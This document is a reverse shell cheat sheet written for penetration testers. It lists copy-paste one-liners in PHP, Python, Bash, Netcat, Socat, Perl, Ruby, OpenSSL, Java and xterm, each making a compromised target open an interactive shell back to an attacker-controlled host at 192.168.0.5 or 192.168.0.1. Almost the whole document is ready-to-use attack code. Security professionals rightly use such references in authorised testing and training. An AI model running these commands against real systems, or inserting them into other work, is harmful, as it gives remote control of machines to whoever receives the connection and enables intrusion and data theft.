### Reverse Shell Cheat Sheet

If you’re lucky enough to find a command execution vulnerability during a penetration test, pretty soon afterwards you’ll probably want an interactive shell.

If it’s not possible to add a new account / SSH key / .rhosts file and just log in, your next step is likely to be either trowing back a reverse shell or binding a shell to a TCP port.  This page deals with the former.

Your options for creating a reverse shell are limited by the scripting languages installed on the target system – though you could probably upload a binary program too if you’re suitably well prepared.

The examples shown are tailored to Unix-like systems.  Some of the examples below should also work on Windows if you use substitute “/bin/sh -i” with “cmd.exe”.

Each of the methods below is aimed to be a one-liner that you can copy/paste.  As such they’re quite short lines, but not very readable.

#### Php :

```
php -r '$sock=fsockopen("192.168.0.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

#### Python :

```
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("192.168.0.5",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
```

#### Bash :

```
bash -i >& /dev/tcp/192.168.0.1/8080 0>&1
```

#### Netcat :

```
nc -e /bin/sh 192.168.0.5 4444
```

#### Socat :

```
socat tcp-connect:192.168.0.5:4444 system:/bin/sh
```

#### Perl :

```
perl -e 'use Socket;$i="192.168.0.5";$p=4545;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

#### Ruby :

```
ruby -rsocket -e'f=TCPSocket.open("192.168.0.5",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)'
```

#### OpenSSL:

On your machine (to receive, not a normal TCP connection)
```
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes # generate some arbitrary cert
openssl s_server -quiet -key key.pem -cert cert.pem -port 4444
```

On PWN'd client
```
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 192.168.0.5:4444 > /tmp/s; rm /tmp/s
```

#### Java :

```
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5< >/dev/tcp/192.168.0.5/4444;cat <& 5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

#### xterm :

```
xterm -display 192.168.0.5:4444
```
